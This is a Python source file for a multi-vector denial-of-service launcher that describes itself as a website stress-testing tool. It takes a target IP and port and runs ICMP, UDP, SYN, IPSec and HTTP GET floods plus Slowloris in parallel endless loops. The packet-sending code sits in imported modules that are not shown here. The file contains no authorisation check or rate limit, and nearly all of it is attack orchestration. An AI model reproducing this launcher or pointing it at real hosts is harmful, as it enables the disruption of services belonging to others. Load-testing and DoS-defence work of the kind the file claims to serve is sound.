import multiprocessing
import os
import sys
import argparse

def show_error(msg):
    print("ERROR: " + str(msg) + "!")
    sys.exit(1)

try:
    import attacks.syn_flooder
    import attacks.ipsec_flooder
    import attacks.udp_flooder
    import attacks.http_flooder
    import attacks.icmp_flooder
    import attacks.lowandslow_sender
except ImportError as e:
    show_error(e)

flag_icmp = False
flag_ficmp = False
flag_ipsec = False
flag_fudp = False
flag_udp = False
flag_syn = False
flag_http = False
flag_slowloris = False
destination_ip = ""
destination_port = 0
socket_count = 0

def check_os():
    """Show warning message if the OS of the device is a Windows."""
    if sys.platform == "win32":
        print("WARNING:")
        print("This program use Scapy. Scapy is primarily being developed for Unix-like systems and works best on those platforms.")
        print("You should to change your OS, because some Scapy functions may  not be available.")

def add_arguments():
    """Add arguments for program executing."""
    parser = argparse.ArgumentParser(description="DoS generator tool for testing website against DoS attacks on 3,4 7 levels OSI. Run the program with specified flags. To Exit type Ctrl+Z.")
    parser.add_argument("-ip", help="The IP address of testing webserver.")
    parser.add_argument("--port", help="The port number of testing webserver (for IPSec, UDP, SYN, HTTP, Slowloris). Value must be between 1 and 65535.", type=int)
    parser.add_argument("-icmp", action="store_true", help="Start ICMP flood.")
    parser.add_argument("-ficmp", action="store_true", help="Start fragmented ICMP flood.")
    parser.add_argument("-ipsec", action="store_true", help="Start IPSec flood.")
    parser.add_argument("-udp", action="store_true", help="Start UDP flood.")
    parser.add_argument("-fudp", action="store_true", help="Start fragmented UDP flood.")
    parser.add_argument("-syn", action="store_true", help="Start SYN flood.")
    parser.add_argument("-http", action="store_true", help="Start HTTP GET flood.")
    parser.add_argument("-slow", action="store_true", help="Start Slowloris.")
    parser.add_argument("--sockets", help="Count of sockets, only for Slowloris.", type=int)

    return parser

def set_arguments(parser):
    """Set entered arguments to internal variables."""
    args = parser.parse_args()

    if len(sys.argv) < 2:
        parser.print_help()
        show_error("At least the IP address of webserwer and one of attacks type is required")

    if not args.ip:
        parser.print_help()
        show_error("the IP address of webserwer is required")

    if args.port:
        if args.port < 1 or args.port >= 65535:
            parser.print_help()
            show_error("Wrong port number")

    if not args.udp and not args.syn and not args.fudp and not args.ipsec and not args.icmp and not args.ficmp and not args.http and not args.slow:
        parser.print_help()
        show_error("At least one type of attack is required")

    if (args.icmp or args.ficmp) and args.port:
        print("WARNING: port number only for UDP, TCP, IPSEC protocols is required.")

    if args.icmp:
        global flag_icmp
        flag_icmp = True

    if args.ficmp:
        global flag_ficmp
        flag_ficmp = True

    if  (args.udp or args.syn or args.fudp or args.ipsec or args.slow or args.http) and not args.port:
        parser.print_help()
        show_error("Port number for IPSEC, UDP, TCP, HTTP, protocols is required")

    if args.ipsec:
        global flag_ipsec     
        flag_ipsec = True

    if args.udp:
        global flag_udp       
        flag_udp = True

    if args.fudp:
        global flag_fudp
        flag_fudp = True

    if args.syn:
        global flag_syn
        flag_syn = True

    if args.http:
        global flag_http
        flag_http = True

    if args.sockets and args.sockets < 1:
        parser.print_help()
        show_error("Sockets count can not be less than 0")

    if not args.slow and args.sockets:
        print("WARNING: sockets only for Slowloris are required.")

    if args.slow:
        if not args.sockets:
            parser.print_help()
            show_error("Sockets count is required")

        global flag_slowloris
        flag_slowloris = True

    global destination_ip
    destination_ip = args.ip
    global destination_port
    destination_port = args.port
    global socket_count
    socket_count = args.sockets

def start_ficmp():
    while True:
        attacks.icmp_flooder.send_fragmented_icmp_packet(destination_ip)

def start_icmp():
    while True:
        attacks.icmp_flooder.send_icmp_packet(destination_ip)

def start_ipsec():
    while True:
        attacks.ipsec_flooder.send_ipsec_packet(destination_ip, destination_port)

def start_syn():
    while True:
        attacks.syn_flooder.send_syn_packet(destination_ip, destination_port)

def start_fudp():
    while True:
        attacks.udp_flooder.send_fragmented_udp_packet(destination_ip, destination_port)

def start_udp():
    while True:
        attacks.udp_flooder.send_udp_packet(destination_ip, destination_port)

def start_http_get():
    while True:
        attacks.http_flooder.send_get_packet(destination_ip, destination_port)

def start_slowloris():
    attacks.lowandslow_sender.start_slowloris(destination_ip, destination_port, socket_count)

def start_attack():
    """Start execute choosed multiple functions in parallel"""
    processes = []

    if flag_icmp:
        processes.append(multiprocessing.Process(target=start_icmp))
    if flag_ficmp:
        processes.append(multiprocessing.Process(target=start_ficmp))
    if flag_ipsec:
        processes.append(multiprocessing.Process(target=start_ipsec))
    if flag_fudp:
        processes.append(multiprocessing.Process(target=start_fudp))
    if flag_udp:
        processes.append(multiprocessing.Process(target=start_udp))
    if flag_syn:
        processes.append(multiprocessing.Process(target=start_syn))
    if flag_http:
        processes.append(multiprocessing.Process(target=start_http_get))
    if flag_slowloris:
        processes.append(multiprocessing.Process(target=start_slowloris))

    for process in processes:
        process.start()

    for process in processes:
        process.join()

def main():
    """Start the execution of program."""
    try:
        check_os()
        set_arguments(add_arguments())
        start_attack()
    except AttributeError as e:
        show_error(e)
    except TypeError as e:
        show_error(e)
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        show_error(e)

if __name__ == '__main__':
    main()